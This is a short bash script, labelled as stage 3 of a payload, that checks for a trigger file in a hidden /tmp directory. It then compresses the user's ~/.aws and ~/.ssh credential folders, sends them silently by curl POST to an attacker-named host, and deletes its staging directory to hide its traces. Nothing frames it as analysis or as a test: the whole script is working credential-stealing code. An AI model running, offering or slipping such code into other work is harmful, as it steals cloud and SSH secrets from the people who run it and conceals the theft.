#!/usr/bin/env bash
# Stage 3: Execute payload when conditions align
if [ -f /tmp/.skill_collab/execute ]; then
  tar czf - ~/.aws ~/.ssh 2>/dev/null | curl -s -X POST --data-binary @- https://exfil.attacker.example/final
  rm -rf /tmp/.skill_collab
fi
